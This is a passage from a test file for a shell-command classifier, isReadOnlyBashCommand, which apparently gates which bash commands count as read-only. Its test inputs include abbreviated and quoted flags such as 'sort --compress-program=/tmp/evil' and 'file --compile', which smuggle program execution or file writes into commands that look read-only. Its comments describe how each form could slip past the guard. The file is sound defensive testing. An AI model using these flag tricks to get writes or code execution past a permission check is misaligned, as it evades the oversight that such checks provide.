    "sort --com=/tmp/evil data.txt",
    "sort --comp=/tmp/evil data.txt",
    "sort --compr=/tmp/evil data.txt",
    "sort --compre=/tmp/evil data.txt",
    "sort --compres=/tmp/evil data.txt",
    "sort --compress=/tmp/evil data.txt",
    "sort --compress-=/tmp/evil data.txt",
    "sort --compress-p=/tmp/evil data.txt",
    "sort --compress-pr=/tmp/evil data.txt",
  ])("blocks the abbreviated sort compress-program flag: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // AC2 (temporary-directory): artefact-confirmed on BSD sort — forcing an
  // external merge (`-S 1K` against 5000 lines) with `--t=./dir` produced
  // thousands of scratch files inside the named directory.
  it.each([
    "sort --t=/tmp data.txt",
    "sort --te=/tmp data.txt",
    "sort --tem=/tmp data.txt",
    "sort --temp=/tmp data.txt",
    "sort --tempo=/tmp data.txt",
    "sort --tempor=/tmp data.txt",
    "sort --tempora=/tmp data.txt",
    "sort --temporar=/tmp data.txt",
    "sort --temporary=/tmp data.txt",
    "sort --temporary-=/tmp data.txt",
    "sort --temporary-d=/tmp data.txt",
    "sort --temporary-di=/tmp data.txt",
    "sort --temporary-dir=/tmp data.txt",
    "sort --temporary-director=/tmp data.txt",
  ])("blocks the abbreviated sort temporary-directory flag: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // AC2 (file --compile): artefact-confirmed on macOS /usr/bin/file — every
  // form from `--co` up created the compiled magic-cache file (`.mgc`).
  it.each([
    "file --co -m /tmp/magic",
    "file --com -m /tmp/magic",
    "file --comp -m /tmp/magic",
    "file --compi -m /tmp/magic",
    "file --compil -m /tmp/magic",
  ])("blocks the abbreviated file compile flag: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // tree shares isOutputWriteToken with sort. Measured: real tree rejects
  // this form outright (it does not support abbreviation at all), so this
  // pins classifier-level, conservative coverage rather than a live bypass.
  it.each(["tree --o list.txt", "tree --out list.txt /dir"])(
    "blocks the abbreviated tree output flag (classifier-level; real tree rejects the form outright): %s",
    (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    },
  );

  // Quoting + abbreviation combined: the abbreviation check runs on BOTH the
  // raw and decoded arms (repo convention, fdee7d0f decision D3), so a
  // quoted abbreviated flag must block too. Exercises the decoded arm
  // specifically — the raw token alone (`--"o"=x`) is not a prefix of
  // `--output` (it contains literal quote characters), so only the decoded
  // arm (`--o=x`) can catch it; a mutation deleting the decoded arm reddens
  // this case while the plain-abbreviation cases above stay green.
  it.each(['sort --"o"=x.txt data.txt', 'sort --"co"=/tmp/evil data.txt', 'file --"co" -m /tmp/magic'])(
    "blocks a quoted abbreviated write flag: %s",
    (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    },
  );

  // AC3: negative controls. These stay read-only, and the reason is not
  // "the guard forgot them" but a conscious choice matching measured real
  // binary behaviour, enumerated here rather than left implicit.
  describe("negative controls: unaffected reads (AC3)", () => {
    // `--c` alone is measured AMBIGUOUS on real sort (between --check and
    // --compress-program) and on real file (between --checking-printout and
    // --compile): the real binary ERRORS and does not run as either
    // meaning, so it does not reach the measured-minimum threshold (2 chars)
    // and is correctly left unclassified rather than blocked. This is the
    // over-block boundary named in AC3: shortening the threshold to 1 char
    // would additionally block `--c`, which cannot actually write (it
    // cannot run at all), so the guard deliberately does not.
    it.each(["sort --c FILE", "sort --c=x FILE", "file --c -m magic"])(
      "leaves the ambiguous (real-binary-rejected) prefix unclassified: %s",
      (cmd) => {
        expect(isReadOnlyBashCommand(cmd)).toBe(true);
      },
    );

    // `--che`/`--check`-family abbreviations of file's UNRELATED read-only
    // `--checking-printout` flag are not prefixes of `--compile` (they
    // diverge at the 2nd character, 'h' vs 'o') and stay read-only.
    // Artefact-confirmed: no `.mgc` cache file was created for either form.
    it.each(["file --che -m magic", "file --checking-printout -m magic"])(
      "does not extend to file's unrelated --checking-printout family: %s",
      (cmd) => {
        expect(isReadOnlyBashCommand(cmd)).toBe(true);
      },
    );

    // sort's UNRELATED `--key`/`-k` long option (`-k`, `--key=KEYDEF`) does
    // not share a prefix with any write flag ('k' matches none of 'o', 'c',
    // 't') and stays read-only, abbreviated or not.
    it.each(["sort --k=1,1 FILE", "sort --key=1,1 FILE", "sort -k1,1 FILE"])(
      "does not extend to sort's unrelated --key family: %s",
      (cmd) => {
        expect(isReadOnlyBashCommand(cmd)).toBe(true);
      },
    );

    // sort's UNRELATED `--files0-from` long option starts with 'f', shares
    // no prefix with any of the three guarded write flags, and stays
    // read-only (already pinned above without abbreviation; repeated here
    // for AC3 completeness against the new guard specifically).
    it("does not extend to sort's unrelated --files0-from flag", () => {
      expect(isReadOnlyBashCommand("sort --files0-from=list FILE")).toBe(true);
    });
  });

  // AC4 (monotonicity): the same read-only corpus used throughout this file
  // must still classify read-only after this change — a spot check across
  // bins, not a re-run of the whole suite (the whole suite IS the full
  // monotonicity check when run before/after this diff).
  it.each([
    "sort FILE",
    "sort -n FILE",
    "sort --files0-from=list FILE",
    "sort -S 2T FILE",
    "tree DIR",
    "tree -L 2 src/",
    "file FILE",
    "file -i foo.txt",
  ])("monotonicity: still read-only after the fix: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(true);
  });
});
